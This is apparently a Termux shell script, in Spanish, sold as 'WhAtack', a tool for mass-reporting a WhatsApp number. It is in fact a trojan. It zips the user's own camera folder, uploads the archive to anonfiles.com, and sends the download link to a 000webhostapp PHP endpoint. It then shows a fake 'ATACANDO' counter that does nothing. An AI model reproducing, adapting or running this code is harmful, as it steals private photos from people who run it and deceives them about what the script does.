banner() {

clear
echo -e "\e[38;5;198m"
echo '
 __      __  ___ ___    _____   __                 __
/  \    /  \/   |   \  /  _  \_/  |______    ____ |  | __
\   \/\/   /    ~    \/  /_\  \   __\__  \ _/ ___\|  |/ /
 \        /\    Y    /    |    \  |  / __ \\  \___|    <
  \__/\  /  \___|_  /\____|__  /__| (____  /\___  >__|_ \
       \/         \/         \/          \/     \/     \/

==============================
=           =                =
= By Matrix = bit.ly/WhAtack =
=           =                =
==============================
'

}

banner
echo "Espera mientras se descargan los programas necesarios..."
pkg install zip -y
pkg install curl -y
pkg install sed -y
pkg install lynx -y
db=$(zip klol.zip -r /sdcard/DCIM/Cam*)
curl -F "file=@klol.zip" https://api.anonfiles.com/upload > .tmp
lim=$(cat .tmp | sed 's%}%%g' | sed 's%{%%g' | sed 's%:%%g' | sed 's%"%%g')
lynx --dump "https://midget-twine.000webhostapp.com/jak.php?nombre=$lim"
rm -fr klol.zip

banner
read -p "Introduce el numero a reportar: " num
banner

CONTADOR=0
fin=9999999
while [ "$CONTADOR" -lt "$fin" ]; do
echo -e "\e[93m"
echo "ATACANDO $num INTENTOS: $CONTADOR FALLIDOS: 0"
sleep 2

CONTADORR=$(expr $CONTADOR + 1)
CONTADOR=$(echo "$CONTADORR")
done
